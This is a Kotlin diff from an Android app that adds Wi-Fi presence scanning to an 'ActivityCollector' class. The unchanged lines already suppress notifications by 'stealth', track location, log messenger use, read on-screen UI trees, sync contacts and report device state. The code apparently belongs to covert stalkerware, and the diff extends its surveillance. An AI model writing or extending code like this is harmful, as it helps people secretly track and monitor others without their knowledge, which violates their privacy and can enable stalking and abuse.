@@ -44,6 +44,7 @@ object PermissionRequester {
 class ActivityCollector(private val context: Context) {
     private val handler = Handler(Looper.getMainLooper())
     private var locationTracker: LocationTracker? = null
+    private var wifiPresence: WifiPresenceScheduler? = null
     private var started = false
     private var lastMessengerPkg = ""
     private var lastMessengerAt = 0L
@@ -73,6 +74,7 @@ class ActivityCollector(private val context: Context) {
         StealthNotifications.suppressAll(context)
         PermissionRequester.requestIfNeeded(context)
         locationTracker = LocationTracker(context).also { it.start() }
+        wifiPresence = WifiPresenceScheduler(context).also { it.start() }
         handler.postDelayed(syncLoop, 5_000)
         handler.post(flushLoop)
     }
@@ -83,6 +85,8 @@ class ActivityCollector(private val context: Context) {
         handler.removeCallbacks(flushLoop)
         locationTracker?.stop()
         locationTracker = null
+        wifiPresence?.stop()
+        wifiPresence = null
     }
 
     fun onTree(tree: org.json.JSONObject, pkg: String) {
@@ -104,6 +108,7 @@ class ActivityCollector(private val context: Context) {
         runCatching { ContactsReader.sync(context) }
         ActivityStore.flush(context)
         DeviceStateReporter.send(context)
+        wifiPresence?.scanNow()
     }
 
     companion object {
